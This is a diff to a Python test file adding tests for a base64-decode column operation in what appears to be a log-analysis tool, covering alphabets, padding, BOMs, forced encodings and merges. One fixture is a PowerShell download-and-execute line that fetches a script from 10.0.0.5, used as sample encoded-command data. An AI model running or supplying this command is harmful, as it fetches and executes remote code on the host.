@@ -1,9 +1,10 @@
-"""URL decode — the first `decode`-family derived op. The pure function
-first (what is decoded, what is kept as written), then that it is an
-ordinary derived column in the store, merges and re-derive included."""
+"""The `decode`-family derived ops, URL decode and base64 decode. The pure
+functions first (what is decoded, what is kept as written), then that each
+is an ordinary derived column in the store, merges and re-derive included."""
 
 from __future__ import annotations
 
+import base64
 import csv
 
 import pytest
@@ -144,3 +145,103 @@ def test_merge_parity(store, tmp_path):
                                  "sort": [{"column": "Decoded", "dir": "asc"}]})
     rows = store.fetch_rows(v["view_id"], 0, 10)["rows"]
     assert [r["cells"][cols.index("Decoded")] for r in rows] == ["p q", "x/y"]
+
+
+# ------------------------------------------------------------------ base64
+
+def _b64(value, **params):
+    op = timeparse.OPERATIONS["base64_decode"]
+    return op["parse"](value, timeparse.validate_params("base64_decode", params), {})
+
+
+def _enc(text, encoding="utf-8"):
+    return base64.b64encode(text.encode(encoding)).decode()
+
+
+_PS = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')"
+
+
+@pytest.mark.parametrize("value, want", [
+    ("aGVsbG8gd29ybGQ=", "hello world"),
+    ("aGVsbG8gd29ybGQ", "hello world"),                 # padding left off
+    ("eyJhbGciOiJIUzI1NiJ9", '{"alg":"HS256"}'),        # a JWT header: URL-safe, unpadded
+    (base64.urlsafe_b64encode(b"?x=1&y=~~~").decode(), "?x=1&y=~~~"),
+    ("Y2Fmw6k=", "café"),
+    ("aGVsbG8K", "hello\n"),                            # a copy, trailing newline and all
+    ("  aGk=  ", "hi"),
+    ("aGVs\r\nbG8=", "hello"),                          # MIME wraps its lines
+    (_enc(_PS, "utf-16le"), _PS),                       # PowerShell -EncodedCommand
+    (base64.b64encode(b"\xff\xfe" + "hi".encode("utf-16le")).decode(), "hi"),   # UTF-16 BOM
+    (base64.b64encode(b"\xef\xbb\xbfhi").decode(), "hi"),                       # UTF-8 BOM
+])
+def test_base64_decodes_either_alphabet_to_text(value, want):
+    assert _b64(value) == want
+
+
+@pytest.mark.parametrize("value", [
+    "hello world", "C:\\Windows\\System32", "1234", "Host", "a", "abc",
+    "SGk=SGk=",                                         # padding in the middle
+    "SGVsbG8===",                                       # more padding than base64 has
+    "AAAA",                                             # three NULs, not text
+    "3F2504E0-4F89-11D3-9A0C-0305E82C3301",             # a GUID is in the URL-safe alphabet
+    "d41d8cd98f00b204e9800998ecf8427e",                 # an MD5
+    base64.b64encode(b"MZ\x90\x00\x03\x00\x00\x00").decode(),   # binary
+    "   ",
+])
+def test_base64_keeps_what_is_not_base64_text_as_written(value):
+    assert _b64(value) == value
+
+
+def test_base64_encoding_can_be_forced():
+    ru = _enc("Привет", "utf-16le")
+    assert _b64(ru) == ru                               # no zero high bytes: auto reads it as UTF-8, and fails
+    assert _b64(ru, encoding="utf-16le") == "Привет"
+    ps = _enc(_PS, "utf-16le")
+    assert _b64(ps, encoding="utf-8") == ps             # NULs between the letters are not text
+    assert _b64(_enc("hey"), encoding="utf-16le") == _enc("hey")   # an odd byte count is no UTF-16
+    with pytest.raises(ValueError, match="must be one of"):
+        timeparse.validate_params("base64_decode", {"encoding": "latin-1"})
+
+
+def test_base64_empty_is_none():
+    assert _b64("") is None
+    assert _b64(None) is None
+
+
+def test_base64_is_listed_beside_url_decode():
+    listed = [o for o in timeparse.list_ops() if o["family"] == "decode"]
+    assert [o["id"] for o in listed] == ["url_decode", "base64_decode"]
+    assert timeparse.validate_params("base64_decode", {}) == {"encoding": "auto"}
+    assert all(r["op_id"] != "base64_decode" for r in timeparse.detect(["aGVsbG8=", "d29ybGQ="]))
+
+
+def test_base64_backfill_preview_and_rederive(store, tmp_path):
+    ru = _enc("Привет", "utf-16le")
+    sid = store.ingest_csv(_write(tmp_path / "b.csv", [
+        [_enc(_PS, "utf-16le"), ""], ["not base64", ""], [ru, ""], ["", ""],
+    ]))["id"]
+    res = store.preview_derived(sid, "Uri", "base64_decode", {})
+    assert [p["output"] for p in res["preview"]] == [_PS, "not base64", ru]
+    assert res["failures"] == 0
+    made = store.add_derived_column(sid, "Decoded", "Uri", "base64_decode", {})
+    store.wait_for_ingest_job(made["job_id"], timeout=30)
+    assert _values(store, sid, "Decoded") == [_PS, "not base64", ru, None]
+    d = next(d for d in store.list_derived_columns(sid) if d["name"] == "Decoded")
+    assert d["status"] == "ready" and d["parse_failures"] == 0
+    store.rederive_column(d["id"], {"encoding": "utf-16le"})
+    store.wait_for_ingest_job(timeout=30)
+    assert _values(store, sid, "Decoded") == [_PS, "not base64", "Привет", None]
+
+
+def test_base64_merge_parity(store, tmp_path):
+    a = store.ingest_csv(_write(tmp_path / "a.csv", [[_enc("alpha"), ""]]))["id"]
+    b = store.ingest_csv(_write(tmp_path / "b.csv", [[_enc("beta", "utf-16le"), ""]]))["id"]
+    merge = store.create_merge("m", [a, b])["id"]
+    res = store.add_derived_column(merge, "Decoded", "Uri", "base64_decode", {})
+    for jid in res["job_ids"]:
+        store.wait_for_ingest_job(jid, timeout=30)
+    cols = [c["name"] for c in store.get_source(merge)["columns"]]
+    v = store.build_view(merge, {"source_id": merge, "filters": [],
+                                 "sort": [{"column": "Decoded", "dir": "asc"}]})
+    rows = store.fetch_rows(v["view_id"], 0, 10)["rows"]
+    assert [r["cells"][cols.index("Decoded")] for r in rows] == ["alpha", "beta"]
